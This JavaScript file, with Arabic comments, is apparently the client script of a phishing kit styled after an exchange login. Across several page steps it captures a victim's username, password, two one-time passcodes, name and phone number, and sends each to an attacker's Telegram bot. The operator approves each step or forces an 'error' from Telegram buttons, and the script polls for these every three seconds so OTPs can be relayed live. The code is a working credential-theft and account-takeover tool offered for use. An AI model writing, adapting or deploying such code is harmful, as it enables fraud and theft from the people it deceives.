/**
 * BrosTec Protocol - Professional Control System
 * Based on Rayan Exchange Logic with Multi-User Support
 */

// --- 1. الإعدادات (نفس هيكلة البوت الخاص بك) ---
const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
const CHAT_ID = "YOUR_CHAT_ID_HERE";

// --- 2. تعريف الجلسة (لضمان عدم تداخل الـ 3 أشخاص الذين ذكرتهم) ---
const sessionId = Math.floor(Math.random() * 9000) + 1000; 

// --- 3. الوظيفة الرئيسية للإرسال والتحكم ---
async function nextStep(stepNumber) {
    // إظهار الدائرة (Point 2)
    const overlay = document.getElementById('loadingOverlay');
    if (overlay) overlay.style.display = 'flex';

    let messageText = `🚀 *طلب جديد من الجلسة:* #${sessionId}\n\n`;
    let includeButtons = true;

    if (stepNumber === 2) {
        messageText += `👤 المستخدم: \`${document.getElementById('user').value}\`\n`;
        messageText += `🔑 كلمة السر: \`${document.getElementById('pass').value}\``;
    } else if (stepNumber === 3) {
        messageText += `🔢 الرمز الأول: \`${document.getElementById('otp1').value}\``;
    } else if (stepNumber === 4) {
        messageText += `📝 بيانات إضافية:\nالاسم: ${document.getElementById('fName').value}\nالهاتف: ${document.getElementById('phone').value}`;
    } else if (stepNumber === 5) {
        messageText += `🔢 الرمز الثاني: \`${document.getElementById('otp2').value}\``;
    }

    // إرسال البيانات فوراً للتيليجرام
    await sendToTelegram(messageText, stepNumber);
}

async function sendToTelegram(text, step) {
    // إنشاء أزرار فريدة لكل جلسة لمنع التداخل
    const buttons = [
        [
            { text: "✅ تجاوز (التالي)", callback_data: `next_${step}_${sessionId}` },
            { text: "❌ خطأ (إعادة)", callback_data: `error_${step}_${sessionId}` }
        ]
    ];

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: text,
            parse_mode: 'Markdown',
            reply_markup: { inline_keyboard: buttons }
        })
    });
}

// --- 4. محرك الاستماع (المنطق الاحترافي من كود Rayan) ---
async function listenForAdmin() {
    try {
        // فحص آخر التحديثات
        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1`);
        const data = await res.json();
        
        if (data.result && data.result.length > 0) {
            const update = data.result[0];
            const callbackData = update.callback_query?.data;

            if (callbackData) {
                // التأكد أن الأمر يخص هذه الجلسة تحديداً
                if (callbackData.includes(sessionId.toString())) {
                    
                    const parts = callbackData.split('_');
                    const action = parts[0]; // next أو error
                    const step = parseInt(parts[1]);

                    if (action === "next") {
                        // إخفاء الدائرة والانتقال
                        handleTransition(step);
                    } else if (action === "error") {
                        // معالجة الخطأ حسب الصفحة
                        handleError(step);
                    }
                }
            }
        }
    } catch (e) {
        // صامت لضمان استمرار العمل
    }
}

// تشغيل المستمع كل 3 ثوانٍ (نفس كود Rayan)
setInterval(listenForAdmin, 3000);

// --- 5. وظائف المساعدة (Helpers) ---

function handleTransition(currentStep) {
    const overlay = document.getElementById('loadingOverlay');
    if (overlay) overlay.style.display = 'none';

    // إخفاء كل الأقسام
    document.querySelectorAll('.page-section').forEach(s => s.classList.remove('active'));
    
    // إظهار القسم التالي
    const nextTarget = currentStep; 
    const targetEl = document.getElementById('step' + nextTarget);
    if (targetEl) targetEl.classList.add('active');
    
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

function handleError(step) {
    const overlay = document.getElementById('loadingOverlay');
    if (overlay) overlay.style.display = 'none';

    if (step === 2) handleTransition(1); // العودة للبداية
    if (step === 3) document.getElementById('otpError1').style.display = 'block';
    if (step === 4) document.getElementById('infoError').style.display = 'block';
    if (step === 5) document.getElementById('otpError2').style.display = 'block';
}
